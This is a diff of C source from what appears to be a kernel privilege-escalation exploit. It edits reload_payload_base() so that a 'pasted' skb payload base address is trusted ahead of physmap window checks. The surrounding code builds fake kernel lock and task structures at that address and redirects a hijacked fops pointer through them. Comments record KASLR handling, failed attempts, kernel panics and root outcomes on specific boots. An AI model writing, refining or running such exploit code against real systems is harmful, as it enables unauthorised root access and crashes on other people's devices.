@@ -2217,6 +2217,18 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
  * Called right before a real pselect attempt so the globals point at the
  * *current* reclaim queue instead of whatever a previous prepare latched. */
 int reload_payload_base(void) {
+  /* Live globals are authoritative BEFORE any file/pvo check: they were
+   * set by THIS run's successful prepare (window-checked) or by
+   * ks_payload_paste (boot_id + physmap-span + kaslr gated).  The pvo
+   * window check further down misfires for a pasted base -- the app
+   * domain's static physmap window (exam2 r4 boot 2050b352: [ffffff80..,
+   * ffffff84..)) differs from the shell holder's MEASURED pvo (pasted
+   * base ffffffaacfae8000, pvo 0x2a...) -- and used to reject the paste
+   * at route time ("pselect reload payload base unavailable; skip
+   * attempt=1", r4 root=0) before this preference ever ran.  The file
+   * stays a fallback for fresh contexts that never ran prepare. */
+  if (skb_payload_base != 0)
+    return 1;
   char line[80];
   memset(line, 0, sizeof(line));
   if (!skbdelta_read_line(line, sizeof(line))) return 0;
@@ -2229,7 +2241,8 @@ int reload_payload_base(void) {
   /* The generic range above spans several boots' physmaps: a skbdelta
    * left by a previous boot (root-owned, shell could not overwrite)
    * passed it and sent the route's pselect at a stale address -> panic.
-   * Require membership in THIS boot's direct map. */
+   * Require membership in THIS boot's direct map.  Only reached with
+   * live globals unset (adopt-from-file path). */
   if (abs_pb < ks_p0_page_offset ||
       abs_pb >= ks_p0_page_offset + (unsigned long long)KS_RAM_SPAN) {
     pr_warning("reload payload base %llx outside current physmap "
@@ -2239,22 +2252,6 @@ int reload_payload_base(void) {
     return 0;
   }
   uintptr_t payload_base = (uintptr_t)abs_pb;
-  /* Prefer the live globals: they were written by THIS run's successful
-   * prepare (skb_payload_base set, window-checked).  The file can hold a
-   * stale value from an earlier attempt or process on the same boot
-   * (observed: prepare wrote 0xffffffa49a3ef180, the route's reload
-   * swapped in 0xffffffa4a2e7f180 from the file, the fops pointer then
-   * targeted a garbage page and the landed route jumped through it ->
-   * kernel_panic).  Only adopt the file value when the globals are
-   * unset (fresh context that never ran prepare_skb_payload). */
-  if (skb_payload_base != 0 && payload_base != skb_payload_base) {
-    pr_warning("reload payload base file=%016zx live=%016zx mismatch; "
-               "keeping live globals (stale file?)\n",
-               payload_base, skb_payload_base);
-    return 1;
-  }
-  if (skb_payload_base != 0)
-    return 1;
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
